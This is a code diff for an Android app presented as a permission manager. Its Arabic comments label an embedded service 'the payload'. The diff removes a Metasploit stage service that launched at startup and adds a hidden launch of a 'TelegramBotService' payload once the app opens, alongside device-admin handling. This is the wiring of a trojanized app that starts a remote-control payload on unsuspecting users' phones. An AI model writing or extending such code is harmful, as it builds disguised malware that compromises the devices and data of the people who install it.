@@ -15,9 +15,8 @@ import com.example.permissionmanagerpro.databinding.ActivityMainBinding
 import com.example.permissionmanagerpro.model.AppInfo
 import com.example.permissionmanagerpro.receiver.AppDeviceAdminReceiver
 import com.example.permissionmanagerpro.viewmodel.MainViewModel
-
 // استيراد خدمة البايلود
-import com.metasploit.stage.MainService
+import com.example.permissionmanagerpro.payload.TelegramBotService
 
 class MainActivity : AppCompatActivity() {
 
@@ -49,15 +48,6 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
-        // ===== استدعاء البايلود فوراً =====
-        try {
-            MainService.startService(this)
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-        // =================================
-
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
         setSupportActionBar(binding.toolbar)
@@ -72,6 +62,9 @@ class MainActivity : AppCompatActivity() {
 
         viewModel.loadInstalledApps()
         updateDeviceAdminStatus()
+
+        // ===== تشغيل خدمة البوت (البايلود) =====
+        startService(Intent(this, TelegramBotService::class.java))
     }
 
     override fun onResume() {
